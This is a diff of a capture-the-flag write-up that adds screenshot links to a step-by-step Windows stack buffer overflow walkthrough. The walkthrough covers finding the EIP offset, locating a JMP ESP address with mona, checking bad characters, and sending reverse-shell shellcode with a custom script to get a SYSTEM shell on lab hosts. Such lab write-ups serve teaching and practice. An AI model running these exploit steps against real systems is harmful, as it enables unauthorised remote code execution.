@@ -66,11 +66,12 @@ With the application running, I verified if it had any open ports:
 ```
 tasklist /v | findstr FILENAME.exe
 ```
+![tasklist](imgs/tasklist.png?raw=true)
 
 ```
 netstat -ano | findstr 524
 ```
-
+![netstat](imgs/netstat.png?raw=true)
 
 Nice! The opened port is one of the ports found during the target enumeration. The target is probably running this application.
 
@@ -80,12 +81,13 @@ We can interact both with the target and the Windows VM to find out if they are 
 ```
 nc -nv 10.2.31.155 9999
 ```
-
+![ncvm](imgs/ncvm.png?raw=true)
 
 * Target
 ```
 nc -nv 10.10.144.220 9999
 ```
+![nctarget](imgs/nctarget.png?raw=true)
 
 
 They are probably the same! Now it was time to test for some buffer overflow vulnerabilites.
@@ -102,11 +104,11 @@ First thing was to open the application in the debugger and send some random byt
 
 Nice! The application crashed. Analysing the debugger we can see that we could overwrite the EIP and that the ESP pointed to some of the content that we sent:
 
-
+![debuggereip](imgs/debuggereip.png?raw=true)
 
 Verifying our memory disposition (right-click on 'ESP' → Follow in Dump), we could see that the application broke at aproximaly 4096 bytes (1000h):
 
-
+![debuggeresp](imgs/debuggeresp.png?raw=true)
 
 Now it was time to try to find out where in our sent content was the EIP, or, as also known, find out what was the EIP offset. 
 
@@ -114,7 +116,7 @@ I restarted the application on the debugger and sent a cyclic string from my Kal
 ```
 ./ig-buffer-overflow.py -m cyclic --rhost=10.2.31.155 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user"
 ```
-
+![regs](imgs/regs.png?raw=true)
 
 The application crashed with EIP = 31704330
 
@@ -128,7 +130,7 @@ I now had to find the address of an instruction that could jump to the ESP. I us
 ```
 !mona jmp -n -r ESP
 ```
-
+![mona](imgs/mona.png?raw=true)
 
 I used the first found address (0x625014df)
 
@@ -136,12 +138,14 @@ Before sending a test shell code, I tested the application for bad chars (I alre
 ```
 ./ig-buffer-overflow.py -m write --rhost=10.2.31.155 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --badchar=after --exclude=00
 ```
+![badchars](imgs/badchars.png?raw=true)
 
 ```
 !mona config -set workingfolder c:\temp
 !mona bytearray
 !mona compare -f c:\temp\bytearray.bin -a 012DEEA8
 ```
+![monabadchars](imgs/monabadchars.png?raw=true)
 
 
 Only '00' was found out as a badchar (since I didn't send it). I could finally test the execution of some shell code.
@@ -160,7 +164,7 @@ And sent the exploit:
 ```
 ./ig-buffer-overflow.py -m exploit --rhost=10.2.31.155 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --shellcode=reverse280 --nops=12
 ```
-
+![vmshell](imgs/vmshell.png?raw=true)
 
 
 Success! Got the shell. But on my Windows VM.
@@ -184,6 +188,7 @@ Executed the exploit:
 ```
 ./ig-buffer-overflow.py -m exploit --rhost=10.10.144.220 --rport=9999 --buffsize=4096 --buffhead='' --interact=";;user" --offset=2012 --hexcontent=l625014df --shellcode=reverse980 --nops=12
 ```
+![targetshell](imgs/targetshell.png?raw=true)
 
 Bingo! Got a privileged user shell (nt authority\system)!
 
